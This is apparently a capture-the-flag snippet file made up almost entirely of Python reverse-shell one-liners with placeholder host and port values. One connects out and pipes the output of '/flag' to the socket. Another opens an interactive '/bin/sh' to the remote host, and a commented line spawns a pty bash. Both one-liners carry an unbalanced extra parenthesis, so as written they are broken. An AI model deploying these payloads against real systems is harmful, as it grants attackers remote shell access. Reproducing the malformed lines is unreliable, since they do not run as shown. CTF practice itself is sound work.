host = 'YOUR HOST'
port = 'YOUR PORT'

import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host, int(port))));subprocess.call(["/flag"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())


import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host, int(port))));subprocess.call(["/bin/sh", "-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())


# python3 -c "import pty;pty.spawn('/bin/bash')"
